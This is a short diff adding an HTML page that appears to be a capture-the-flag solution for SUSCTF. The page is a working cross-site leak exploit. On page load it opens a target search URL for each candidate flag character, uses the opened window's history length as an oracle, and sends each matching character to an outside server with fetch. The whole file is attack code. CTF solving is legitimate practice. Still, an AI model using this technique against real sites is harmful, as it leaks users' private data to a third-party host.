@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html lang="en">
+<body onload=exp()>
+</body>
+<script>
+    function exp(){
+        let charset = "1234567890_qwertyuiopasdfghjklzxcvbnm"
+        for(let c of charset){
+            test(c)
+        }
+    }
+    function test(c) {
+        let win = open("http://123.60.29.171:10001/search?q=SUSCTF{"+ c )
+
+        setTimeout(()=>{win.location="http://106.15.53.153"}, 2000)
+        setTimeout(()=>{
+            console.log(c)
+            console.log(win.history.length)
+            if(win.history.length === 3)
+            {
+                fetch("http://106.15.53.153:10000/?" + c)
+            }
+        }, 4000)
+        setTimeout(()=>{
+            win.close()
+        }, 5000)
+    }
+
+</script>
+</html>
